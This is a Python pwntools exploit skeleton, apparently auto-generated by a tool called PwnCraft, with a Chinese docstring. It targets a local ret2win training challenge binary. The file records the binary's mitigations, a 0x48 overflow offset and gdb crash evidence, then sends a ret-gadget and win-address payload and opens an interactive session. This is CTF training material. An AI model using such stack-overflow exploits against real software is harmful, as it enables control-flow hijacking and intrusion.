"""PwnCraft 自动生成 EXP 骨架 — 确定性事实渲染，必须人工复核后使用。

strategy    : ret2win（ret2win（跳过程序内现成调用点））  status=ready
target      : F:\pwn宝\pwncraft\artifacts\gw-training\intelpwn\challenge_ret2win  sha256=242167adf3d91bae…  amd64/64-bit  endian=little
mitigations : PIE=OFF NX=ON CANARY=OFF RELRO=PARTIAL FORTIFY=OFF
provenance  : DERIVED（ELF 字节 / objdump / 重定位；离线、无模型推断）
evidence    :
  - 0x4011c1: call execve
  - 参数地址 0x402028
  - gdb: Program received signal SIGSEGV
  - gdb: rip=0x40123a
  - gdb: rbp=0x6161617261616171
  - gdb: rsp=0x7fffffffdde8
  - cyclic: offset = 0x48（方法 saved_rbp）
"""
from pwn import *

TARGET = 'F:\\pwn宝\\pwncraft\\artifacts\\gw-training\\intelpwn\\challenge_ret2win'
context.binary = elf = ELF(TARGET, checksec=False)
context.log_level = "info"

OFFSET = 0x48
RET = 0x40101a
WIN = 0x401196

UNRESOLVED = []

def exploit():
    if UNRESOLVED:
        raise SystemExit("补齐 UNRESOLVED 常量后再运行: " + ", ".join(UNRESOLVED))
    io = process(TARGET)
    payload = flat({OFFSET: [p64(RET), p64(WIN)]})
    io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    exploit()
